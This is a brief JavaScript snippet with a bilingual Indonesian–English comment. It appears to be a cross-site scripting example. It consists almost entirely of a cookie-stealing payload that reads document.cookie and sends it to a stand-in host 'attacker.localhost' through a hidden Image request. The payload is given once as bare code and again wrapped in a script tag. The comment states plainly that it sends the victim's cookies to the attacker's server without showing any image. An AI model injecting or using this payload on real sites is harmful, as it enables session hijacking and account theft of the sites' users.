new Image().src =
  "https://attacker.localhost/cookies/" + encodeURIComponent(document.cookie);
/* 
hello bro
<script>
  new Image().src =
  "https://attacker.localhost/cookies/" + encodeURIComponent(document.cookie);
</script>

Inonesia : Kode ini mengirim cookie korban ke server attacker menggunakan JavaScript tanpa menampilkan gambar:
English : This code sends the victim’s cookies to the attacker’s server using JavaScript without showing any image:
*/
